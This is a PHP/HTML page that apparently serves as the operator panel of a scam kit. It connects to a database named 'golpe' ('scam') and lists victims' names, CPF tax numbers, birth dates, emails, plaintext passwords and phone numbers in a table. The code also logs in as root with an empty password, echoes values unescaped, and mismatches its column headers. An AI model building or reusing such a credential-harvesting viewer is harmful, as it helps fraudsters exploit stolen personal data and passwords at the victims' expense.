<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dados do Banco de Dados</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        padding: 20px;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 20px;
        background-color: #fff;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    table th, table td {
        border: 1px solid #ccc;
        padding: 10px;
        text-align: left;
    }
    table th {
        background-color: #f2f2f2;
    }
    table tr:nth-child(even) {
        background-color: #f9f9f9;
    }
    table tr:hover {
        background-color: #e0e0e0;
    }
</style>
</head>
<body>

<h2>Tabela de Dados do Banco de Dados</h2>

<table>
    <thead>
        <tr>
            <th>ID</th>
            <th>Nome</th>
            <th>Email</th>
            <th>Telefone</th>
        </tr>
    </thead>
    <tbody>
        <?php
           include('db.php');


        $host = "localhost";
        $database = "golpe";
        $usuario = "root";
        $senha = "";
        
        // Conexão com o banco de dados (exemplo usando MySQLi)
        $conexao = new mysqli($host,$usuario, $senha, $database);

        // Verifica a conexão
        if ($conexao->connect_error) {
            die("Erro na conexão com o banco de dados: " . $conexao->connect_error);
        }

        // Consulta os dados da tabela 'usuarios'
        $sql = "SELECT pf_nome_cliente,	pf_cpf_cliente,	pf_data_nascimento	,email_cliente,	senha_cliente,	telefone_cliente_2,	telefone_cliente	
 FROM dados";
        $resultado = $conexao->query($sql);

        // Verifica se encontrou algum registro
        if ($resultado->num_rows > 0) {
            // Loop pelos registros encontrados
            while($row = $resultado->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . $row["pf_nome_cliente"] . "</td>";
                echo "<td>" . $row["pf_data_nascimento"] . "</td>";
                echo "<td>" . $row["email_cliente"] . "</td>";
                echo "<td>" . $row["senha_cliente"] . "</td>";
                echo "<td>" . $row["telefone_cliente_2"] . "</td>";
                echo "<td>" . $row["telefone_cliente"] . "</td>";
                echo "</tr>";
            }
        } else {
            echo "<tr><td colspan='4'>Nenhum registro encontrado.</td></tr>";
        }

        // Fecha a conexão com o banco de dados
        $conexao->close();
        ?>
    </tbody>
</table>

</body>
</html>
